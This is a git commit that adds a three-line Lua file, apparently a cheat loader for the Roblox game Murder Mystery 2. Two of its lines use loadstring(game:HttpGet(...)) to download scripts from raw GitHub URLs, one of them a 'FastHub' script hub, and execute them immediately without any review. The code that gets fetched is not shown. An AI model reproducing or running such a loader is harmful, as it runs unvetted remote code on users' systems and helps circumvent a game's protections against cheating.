150ae6609f37b7f38c52bb1caa64577ae557a7d0
haiiipplheh <pokemongofannn1@gmail.com>
2026-06-03 12:58:24 -0700

    Create wowow.lua

---
+++ wowow.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripter21245/FASTHUB-MM2/refs/heads/main/FastHub-Mm2/MM2-FastHub"))()
+task.wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/haiiipplheh/woowmm2scriptwoohooo/refs/heads/main/wow.lua"))()
